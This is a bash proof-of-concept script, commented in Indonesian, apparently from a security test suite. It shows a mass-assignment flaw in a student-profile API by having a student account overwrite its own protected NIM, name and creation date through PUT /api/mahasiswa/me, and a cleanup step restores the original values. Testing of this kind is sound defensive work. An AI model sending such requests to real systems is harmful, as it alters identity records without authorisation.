#!/usr/bin/env bash
# S9 - Mass assignment pada update profil mahasiswa (PUT /api/mahasiswa/me)
# Sink: src/controllers/mahasiswaController.js updateMe() -> { ...req.body } tanpa whitelist
#       src/models/mahasiswaModel.js updateByUserId() -> SET dibangun dari Object.keys(d)
# Prasyarat: peran mahasiswa, menargetkan baris profilnya SENDIRI (bukan IDOR), tapi
# lewat kolom yang seharusnya tidak boleh diubah sendiri (nim, nama, created_at).
# Skrip ini MEMULIHKAN nilai ke semula di akhir.
set -euo pipefail
cd "$(dirname "$0")"
source ./00-login.sh
B="$BASE_URL"; ANH="Authorization: Bearer $ANDI_TOKEN"

echo "== Baseline: profil andi sebelum =="
BEFORE=$(curl -s -m 10 "$B/api/mahasiswa/me" -H "$ANH")
NIM_ASLI=$(echo "$BEFORE" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>process.stdout.write(JSON.parse(d).data.nim))")
NAMA_ASLI=$(echo "$BEFORE" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>process.stdout.write(JSON.parse(d).data.nama))")
echo "nim=$NIM_ASLI nama=$NAMA_ASLI"

cleanup() {
  curl -s -m 10 -X PUT "$B/api/mahasiswa/me" -H "$ANH" -H 'Content-Type: application/json' \
    -d "{\"nim\":\"$NIM_ASLI\",\"nama\":\"$NAMA_ASLI\"}" >/dev/null
  echo "(nim dan nama andi dipulihkan)" >&2
}
trap cleanup EXIT

echo "== S9: andi kirim field terproteksi (nim, nama, created_at) lewat endpoint update profil sendiri =="
curl -s -m 10 -X PUT "$B/api/mahasiswa/me" -H "$ANH" -H 'Content-Type: application/json' \
  -d '{"nim":"999999999999","nama":"DIUBAH PAKSA MAHASISWA","created_at":"2000-01-01T00:00:00Z"}' -w "\nHTTP %{http_code}\n"

AFTER=$(curl -s -m 10 "$B/api/mahasiswa/me" -H "$ANH")
NIM_BARU=$(echo "$AFTER" | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>process.stdout.write(JSON.parse(d).data.nim))")
echo "nim sekarang: $NIM_BARU"

echo
if [ "$NIM_BARU" = "999999999999" ]; then
  echo "KESIMPULAN: TERBUKTI. Mahasiswa berhasil mengubah NIM (identitas akademik, seharusnya hanya admin) lewat endpoint update profil sendiri."
else
  echo "KESIMPULAN: TIDAK TERBUKTI pada percobaan ini."
fi
